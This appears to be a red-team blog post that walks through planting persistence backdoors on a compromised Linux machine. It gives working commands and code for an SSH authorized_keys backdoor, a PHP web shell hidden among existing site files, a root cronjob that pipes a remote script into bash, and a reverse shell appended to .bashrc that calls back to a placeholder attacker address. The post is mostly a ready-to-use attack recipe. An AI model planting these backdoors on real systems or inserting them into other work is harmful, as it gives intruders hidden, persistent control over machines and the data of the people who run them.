---
title: "ffuf"
collection: posts
type: "Info"
permalink: /posts/backdoors
venue: "Red Teaming"
date: 2023-03-12
location: "City, Country"
---

## Description : 

A backdoor is any method that allows somebody to remotely access your device without your permission or knowledge.

---

**SSH backdoors :**
First you need to generate a set of ssh keys : 

```bash
# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:0C5OkoRl+Zm8wESgHHlN5oZsfq/bx2UN4Dwbd5mkKK4 root@ip-10-10-235-216
The key's randomart image is:
+---[RSA 2048]----+
| .oo*+           |
|.oo=*. . .   .   |
|..o*.=.o+ o o o  |
|  o.+.=+ * + +   |
|   .oo+.S = +    |
|    .+oo . o .   |
|      o.. o      |
|     Eo  o       |
|     o...        |
+----[SHA256]-----+

```


* Now you have two keys: 1 private key and 1 public key
* You rename the public key from **id_rsa.pub** to **authorized_keys** and leave it in /root/.ssh

* You copy the id_rsa which is the prvate key to your machine and give the right permission 

```bash
chmod 600 id_rsa
```

* Now you can login to the target machine via ssh 

```bash
ssh -i id_rsa USERNAME@X.X.X.X
```

--- 

**PHP Backdoors :**

* Create a php file 

```bash
touch file.php
```

* Content of this file : 

```bash
<?php
if (isset($_REQUEST['cmd'])) {
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}

?>
```

* Try to put this file in already existing php files in **/var/www/html**

* You can access the file by visiting : **http://X.X.X.X/DIRECTORY/file.php**

--- 

**Cronjob Backdoors :**

* Create a cronjob 

```bash
* *     * * *   root    curl http://<yourip>:PORT/shell | bash
```

* The content of the shell file in your machine : 

```bash
#!/bin/bash
bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1
```

---

**.bashrc Backdoor :**
* If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched.

* You run this command 

```bash
echo 'bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1' >> ~/.bashrc
```

* If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched.

* You should always have your nc listener ready because you don't know when a user will login to their system.